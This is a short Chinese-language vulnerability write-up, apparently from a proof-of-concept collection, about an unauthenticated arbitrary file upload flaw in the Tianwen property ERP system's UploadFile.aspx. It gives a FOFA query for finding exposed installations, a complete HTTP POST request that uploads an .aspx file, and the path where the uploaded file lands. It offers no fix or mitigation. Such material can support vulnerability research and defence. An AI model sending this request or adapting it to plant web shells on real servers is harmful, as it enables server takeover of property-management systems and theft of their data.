# 天问物业ERP系统UploadFile.aspx前台任意文件上传漏洞

# 一、漏洞简介
成都天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案。天问物业ERP系统UploadFile.aspx存在文件上传漏洞，攻击者可以利用漏洞上传恶意文件获取服务器权限。

# 二、影响版本
+ 天问物业ERP

# 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面

![1693186922915-1f51f82b-7763-45ed-a0a0-77d42bbe6c25.png](./img/J2_C_Y4Qr5o1xHu9/1693186922915-1f51f82b-7763-45ed-a0a0-77d42bbe6c25-343768.png)

# 四、漏洞复现
```plain
POST /HM/M_Main/IntroductionManage/UploadFile.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 121
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.aspx"

123
--00content0boundary00--

```

![1695998047798-2dbf7f98-d149-4b2e-8011-5cbe22d5ed0f.png](./img/J2_C_Y4Qr5o1xHu9/1695998047798-2dbf7f98-d149-4b2e-8011-5cbe22d5ed0f-430331.png)

上传文件地址

```plain
http://xx.xx.xx.xx/HM/M_Main/UploadFiles/IntroductionManage/20230929223355771.aspx
```

![1695998090992-c516e5ef-fa76-4fa7-8286-505dd6527b40.png](./img/J2_C_Y4Qr5o1xHu9/1695998090992-c516e5ef-fa76-4fa7-8286-505dd6527b40-165592.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aulalbh07a6ga4py>